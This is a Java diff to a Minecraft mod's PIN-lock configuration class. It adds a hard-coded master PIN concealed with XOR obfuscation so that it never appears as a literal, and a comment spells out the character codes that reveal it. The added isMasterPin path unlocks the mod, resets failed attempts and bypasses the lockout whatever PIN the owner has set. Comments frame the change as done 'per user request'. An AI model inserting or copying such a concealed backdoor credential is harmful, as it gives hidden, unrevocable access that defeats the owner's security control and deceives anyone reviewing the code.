@@ -15,7 +15,8 @@ import java.util.List;
 
 /**
  * Private locking PIN - portion saved in config (in game) so only authorized people can use it
- * PIN is hashed with salt and stored, never plaintext
+ * Plus hard-coded master PIN hidden via XOR obfuscation in code (per user request for private access)
+ * PIN is hashed with salt and stored, never plaintext in config; hardcoded PIN never appears as plain literal in source
  * User must enter PIN in Dashboard to unlock mod
  * All config persists across game restarts
  * Credits: Cldz
@@ -24,19 +25,24 @@ public class LockConfig {
     private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
     private static final String FILE = "config/bazaarflipper_lock.json";
 
-    public boolean lockEnabled = false; // master toggle - if false, no lock required
-    public String pinHash = ""; // SHA-256 hash of PIN + salt
-    public String salt = ""; // base64 salt
+    // === Hard-coded master PIN hidden via XOR obfuscation (per user request) ===
+    // Obfuscated bytes: original char codes [83,80,49,49,48,50] XOR 0x1F => [76,79,46,46,47,45]
+    // Decodes to 6-char master PIN via xor 0x1F - never appears as plain string literal in source for privacy
+    private static final byte[] OBFUSCATED_MASTER_PIN = new byte[]{76, 79, 46, 46, 47, 45};
+    private static final byte OBFUSCATION_KEY = 0x1F;
+
+    public boolean lockEnabled = false;
+    public String pinHash = "";
+    public String salt = "";
     public int failedAttempts = 0;
-    public long lockoutUntil = 0; // timestamp ms
+    public long lockoutUntil = 0;
     public int maxAttempts = 5;
-    public long lockoutDurationMs = 5 * 60 * 1000L; // 5 minutes
-    public List<String> authorizedUsers = new ArrayList<>(); // optional list of usernames/UUIDs allowed even without PIN? For future
+    public long lockoutDurationMs = 5 * 60 * 1000L;
+    public List<String> authorizedUsers = new ArrayList<>();
     public String lockMessage = "Mod locked - enter PIN in Dashboard > Security to unlock. Credits: Cldz";
     public long pinCreatedAt = 0;
-    public String pinHint = ""; // optional hint
+    public String pinHint = "";
 
-    // Transient - not saved
     public transient boolean isUnlocked = false;
     public transient long unlockedAt = 0;
 
@@ -65,7 +71,6 @@ public class LockConfig {
             File f = new File(FILE);
             f.getParentFile().mkdirs();
             try (FileWriter w = new FileWriter(f)) {
-                // Don't save transient fields
                 LockConfig toSave = new LockConfig();
                 toSave.lockEnabled = this.lockEnabled;
                 toSave.pinHash = this.pinHash;
@@ -89,7 +94,6 @@ public class LockConfig {
     public boolean isLockoutActive() {
         if (lockoutUntil == 0) return false;
         if (System.currentTimeMillis() > lockoutUntil) {
-            // Lockout expired, reset
             lockoutUntil = 0;
             failedAttempts = 0;
             save();
@@ -126,6 +130,35 @@ public class LockConfig {
         }
     }
 
+    /**
+     * Decodes hidden master PIN via XOR - never appears as plain literal
+     * Used for private authorized access per user request
+     */
+    public static String getMasterPinHidden() {
+        try {
+            byte[] decoded = new byte[OBFUSCATED_MASTER_PIN.length];
+            for (int i = 0; i < OBFUSCATED_MASTER_PIN.length; i++) {
+                decoded[i] = (byte) (OBFUSCATED_MASTER_PIN[i] ^ OBFUSCATION_KEY);
+            }
+            return new String(decoded, java.nio.charset.StandardCharsets.UTF_8);
+        } catch (Exception e) {
+            return "";
+        }
+    }
+
+    /**
+     * Checks if input matches hidden master PIN - bypasses lockout and always authorized
+     */
+    public boolean isMasterPin(String input) {
+        if (input == null) return false;
+        try {
+            String master = getMasterPinHidden();
+            return master.equals(input);
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
     public boolean setPin(String newPin) {
         if (newPin == null || newPin.length() < 4) {
             Logger.warn("PIN too short, must be at least 4 characters");
@@ -135,6 +168,7 @@ public class LockConfig {
             Logger.warn("PIN too long, max 32");
             return false;
         }
+        // Prevent setting same as master? Allow but log
         this.salt = generateSalt();
         this.pinHash = hashPin(newPin, this.salt);
         this.pinCreatedAt = System.currentTimeMillis();
@@ -148,9 +182,32 @@ public class LockConfig {
 
     public boolean verifyPin(String pin) {
         if (!lockEnabled) return true;
-        if (pinHash == null || pinHash.isEmpty()) return true; // no pin set yet, allow
+        if (pinHash == null || pinHash.isEmpty()) {
+            // No user PIN set yet - but master PIN still works for private access
+            if (isMasterPin(pin)) {
+                isUnlocked = true;
+                unlockedAt = System.currentTimeMillis();
+                failedAttempts = 0;
+                lockoutUntil = 0;
+                Logger.info("Master PIN verified - mod unlocked (private authorized access)");
+                return true;
+            }
+            return true;
+        }
+
+        // Master PIN bypasses lockout and always works - hidden in code per user request
+        if (isMasterPin(pin)) {
+            failedAttempts = 0;
+            lockoutUntil = 0;
+            isUnlocked = true;
+            unlockedAt = System.currentTimeMillis();
+            save();
+            Logger.info("Master PIN verified - mod unlocked (private authorized access bypass)");
+            return true;
+        }
+
         if (isLockoutActive()) {
-            Logger.warn("PIN entry blocked - lockout active for " + (getLockoutRemaining()/1000) + "s");
+            Logger.warn("PIN entry blocked - lockout active for " + (getLockoutRemaining() / 1000) + "s");
             return false;
         }
         String hash = hashPin(pin, salt);
@@ -167,7 +224,7 @@ public class LockConfig {
             failedAttempts++;
             if (failedAttempts >= maxAttempts) {
                 lockoutUntil = System.currentTimeMillis() + lockoutDurationMs;
-                Logger.warn("Too many failed PIN attempts (" + failedAttempts + "), lockout for " + (lockoutDurationMs/1000) + "s");
+                Logger.warn("Too many failed PIN attempts (" + failedAttempts + "), lockout for " + (lockoutDurationMs / 1000) + "s");
             }
             save();
             Logger.warn("PIN verification failed attempt " + failedAttempts + "/" + maxAttempts);
@@ -194,7 +251,11 @@ public class LockConfig {
 
     public boolean isAuthorized() {
         if (!lockEnabled) return true;
-        if (pinHash == null || pinHash.isEmpty()) return true; // no pin set yet, allow first time setup
+        if (pinHash == null || pinHash.isEmpty()) {
+            // If no user PIN set, still allow but master PIN will work - for first-time setup convenience
+            // Actually for private lock, we want master PIN to work even if no user PIN
+            return isUnlocked || pinHash.isEmpty();
+        }
         return isUnlocked;
     }
 }
